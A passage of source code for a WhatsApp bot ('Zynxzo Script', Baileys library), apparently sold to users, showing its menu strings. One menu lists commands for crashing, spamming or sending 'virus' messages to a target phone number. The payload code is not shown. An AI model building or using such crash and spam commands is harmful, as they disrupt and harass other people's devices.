͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
┏───────────────────┓
│ 𝐎𝐰𝐧𝐞𝐫 : *${global.NamaOwner}*
│ 𝐁𝐨𝐭𝐧𝐚𝐦𝐞 : *${global.namabot}*
│ 𝐔𝐬𝐞𝐫 : ${isPremium ? '𝗩𝗶𝗽' : '𝗙𝗿𝗲𝗲' }
│ 𝐌𝐨𝐝𝐞 : 𝗣𝗿𝗶𝘃𝗮𝘁𝗲
│ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟳.𝟬
│ 𝐒𝐭𝐚𝐭𝐮𝐬 : 𝗢𝗻𝗹𝗶𝗻𝗲
│ 𝐑𝐮𝐧 : *${runtime(process.uptime())}*
╰┓ 𝐋𝐢𝐛𝐫𝐚𝐲 : 𝗕𝗮𝗶𝗹𝘆𝘀 - 𝗦𝗼𝗰𝗸𝗲𝘁
   ┗──────────────────┛
┏──╴[ 𝘽𝙐𝙂 𝘾𝙍𝘼𝙎𝙃 ]╶───┓
│${global.simbol} ${prefix}ɴɢᴇᴄʀᴏᴛ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ʙᴜɢᴄʀᴀsʜ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴢʏɴxᴢᴏᴄ1 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴢʏɴxᴢᴏʟᴏᴄᴠɪʀ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴢʏɴxᴢᴏᴠɪʀᴜs 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴢʏɴxᴢᴏsʟᴏᴛ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴢʏɴxᴢᴏᴍᴏᴅs 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴢʏɴxᴢᴏᴄʟᴇᴀʀ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴋɪʟʟᴡʜᴀɴɢsᴀғғ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴠɪʀᴜssʟᴏᴛ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴢʏɴxᴢᴏᴀᴜᴛᴏᴄʀᴏᴛ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴍᴀᴍᴘᴜsᴄ1 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴄ1ᴅᴇᴋ 𝟲𝟮𝟴𝗫𝗫𝗫
┗─────────────────┛
┏───╴[ 𝘽𝙐𝙂 𝙎𝙋𝘼𝙈 ]╶──┓
│${global.simbol} ${prefix}sᴘᴀᴍʙᴜɢ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}sᴘᴀᴍɴᴏᴛɪғ 𝟲𝟮𝟴𝗫𝗫𝗫 
│${global.simbol} ${prefix}sᴘᴀᴍᴜɪ 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────┛
┏───╴[ 𝘽𝙐𝙂 𝙀𝙈𝙊𝙅𝙄 ]╶──┓
│${global.simbol} ${prefix}🤨 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}🤪 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}🦸🏻‍♂️ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}🦖 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}☠️ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}😖 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}🥴 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}🤯 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}💦 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}🖕 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────┛
  ┏───────────────┓
  │ 𝘾𝙧𝙚𝙖𝙩𝙤𝙧 𝘽𝙮 : @𝙕𝙮𝙣𝙭𝙯𝙤
  │ 𝙋𝙤𝙬𝙚𝙧𝙙 𝘽𝙮 : @𝙕𝙮𝙣𝙭𝙯𝙤
  ┗───────────────┛`)
}
break
//=================================================//
case 'ownermenu': {
await loading()
zreply(`┏─╴[ 𝗭𝗬𝗡𝗫𝗭𝗢 𝗦𝗖𝗥𝗜𝗣𝗧 ] ──┓
│ 𝗛𝘆 *${m.pushName}*
│ *${time}*
│ *${ucapanWaktu}*
┗─────────────────┛͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
┏───────────────────┓
│ 𝐎𝐰𝐧𝐞𝐫 : *${global.NamaOwner}*
│ 𝐁𝐨𝐭𝐧𝐚𝐦𝐞 : *${global.namabot}*
│ 𝐔𝐬𝐞𝐫 : ${isPremium ? '𝗩𝗶𝗽' : '𝗙𝗿𝗲𝗲' }
│ 𝐌𝐨𝐝𝐞 : 𝗣𝗿𝗶𝘃𝗮𝘁𝗲
│ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟳.𝟬
│ 𝐒𝐭𝐚𝐭𝐮𝐬 : 𝗢𝗻𝗹𝗶𝗻𝗲
│ 𝐑𝐮𝐧 : *${runtime(process.uptime())}*
╰┓ 𝐋𝐢𝐛𝐫𝐚𝐲 : 𝗕𝗮𝗶𝗹𝘆𝘀 - 𝗦𝗼𝗰𝗸𝗲𝘁
   ┗──────────────────┛
┏───╴[ 𝗢𝗪𝗡𝗘𝗥 ]╶───┓
│${global.simbol} ${prefix}ᴘᴜʙʟɪᴄ
│${global.simbol} ${prefix}sᴇʟғ
│${global.simbol} ${prefix}ᴀᴅᴅᴘʀᴇᴍ
│${global.simbol} ${prefix}ᴅᴇʟᴘʀᴇᴍ
│${global.simbol} ${prefix}ʟɪsᴛᴘʀᴇᴍ
│${global.simbol} ${prefix}ʀᴇᴍɪɴɪ
│${global.simbol} ${prefix}ᴀᴅᴅᴘʟᴜɢ
│${global.simbol} ${prefix}ᴄɢᴘʟᴜɢ
│${global.simbol} ${prefix}ɢᴇᴛᴘʟᴜɢ
│${global.simbol} ${prefix}ʀᴍᴘʟᴜɢ
│${global.simbol} ${prefix}ʀᴇᴀᴅᴠᴏ
│${global.simbol} ${prefix}sᴛɪᴄᴋᴇʀ
│${global.simbol} ${prefix}ᴘɪɴɢ
│${global.simbol} ${prefix}ᴀᴛᴛᴘ
│${global.simbol} ${prefix}ʜᴅʀ
│${global.simbol} ${prefix}ʀᴇᴍᴏᴠᴇʙɢ
┗───────────────┛
 ┏───────────────┓
 │ 𝘾𝙧𝙚𝙖𝙩𝙤𝙧 𝘽𝙮 : @𝙕𝙮𝙣𝙭𝙯𝙤
 │ 𝙋𝙤𝙬𝙚𝙧𝙙 𝘽𝙮 : @𝙕𝙮𝙣𝙭𝙯𝙤
 ┗───────────────┛`)
}
break
//=================================================//
case 'buysc': case 'sc': {
await loading()
zreply(`┏─╴[ 𝗭𝗬𝗡𝗫𝗭𝗢 𝗦𝗖𝗥𝗜𝗣𝗧 ] ──┓
│ 𝗛𝘆 *${m.pushName}*
│ *${time}*
│ *${ucapanWaktu}*
┗─────────────────┛͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏